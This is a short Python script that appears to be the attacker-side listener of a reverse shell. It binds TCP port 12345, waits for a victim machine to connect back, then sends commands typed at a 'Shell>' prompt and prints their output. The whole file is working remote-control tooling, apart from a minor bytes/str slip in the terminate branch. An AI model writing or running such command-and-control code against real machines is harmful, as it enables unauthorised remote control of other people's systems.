from socket import *

def connect():
    # TCP connection
    sock = socket(AF_INET, SOCK_STREAM)

    port = 12345
    sock.bind(('', port))

    sock.listen(1)

    print("[+] Listening for incoming TCP connection on port ", port)

    while 1:    
        conn, addr = sock.accept()
        print("Connection from: ", addr)
        
        while 1:
            command = input("Shell> ")

            if "terminate" in command:
                conn.send("terminate")
                conn.close()
                break
            else:
                # send command to client
                conn.send(command.encode())
                # print response
                print(conn.recv(1024).decode("utf-8") )

def main():
    connect()
main()
